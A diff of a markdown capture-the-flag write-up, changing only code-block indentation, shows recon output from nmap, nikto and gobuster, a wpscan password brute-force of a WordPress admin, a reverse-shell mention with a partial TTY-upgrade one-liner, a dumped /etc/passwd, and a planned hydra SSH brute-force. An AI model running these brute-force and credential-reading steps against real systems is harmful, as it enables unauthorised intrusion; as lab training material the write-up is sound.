@@ -16,7 +16,7 @@ nikto -h $IP
 ```
 
 ??? output "Nmap output"
-   ``` sh
+    ``` sh
     nmap -sC -sV $IP
     Nmap scan report for 10.10.156.30
     Host is up (0.020s latency).
@@ -34,10 +34,10 @@ nikto -h $IP
 
     Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
     Nmap done: 1 IP address (1 host up) scanned in 8.50 seconds
-   ```
+    ```
 
 ??? output "nikto output"
-   ``` sh
+    ``` sh
     nikto -h $IP
     - Nikto v2.1.6
     ---------------------------------------------------------------------------
@@ -61,10 +61,10 @@ nikto -h $IP
     + 8042 requests: 0 error(s) and 11 item(s) reported on remote host
     ---------------------------------------------------------------------------
     + 1 host(s) tested
-   ```
+    ```
 
 ??? output "gobuster output"
-   ``` txt
+    ``` txt
     gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.156.30:80
     ===============================================================
     /blog                 (Status: 301) [Size: 311] [--> http://10.10.156.30/blog/]
@@ -72,10 +72,10 @@ nikto -h $IP
     /javascript           (Status: 301) [Size: 317] [--> http://10.10.156.30/javascript/]
     /phpmyadmin           (Status: 301) [Size: 317] [--> http://10.10.156.30/phpmyadmin/]
     /server-status        (Status: 403) [Size: 277]
-   ```
+    ```
 
 ??? output "Wordpress output"
-   ``` txt
+    ``` txt
     wpscan --url http://10.10.156.30/wordpress -P rockyou.txt -U admin
     _______________________________________________________________
             __          _______   _____
@@ -145,7 +145,7 @@ nikto -h $IP
 
     [!] No WPScan API Token given, as a result vulnerability data has not been output.
     [!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register
-   ```
+    ```
 
 So now we can login to wordpress as admin and look around.
 
@@ -160,7 +160,7 @@ We now get a reverse shell but no TTY so we can try this:``` python -c 'import p
 Let's have a look around:
 
 ??? output "cat /etc/passwd output"
-   ``` sh
+    ``` sh
     cat /etc/passwd
     root:x:0:0:root:/root:/bin/bash
     daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -193,7 +193,7 @@ Let's have a look around:
     sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
     aubreanna:x:1000:1000:aubreanna:/home/aubreanna:/bin/bash
     mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
-   ```
+    ```
 
 The /home path shows one user "aubreanna" so let's use this to crack ssh using hydra:
 
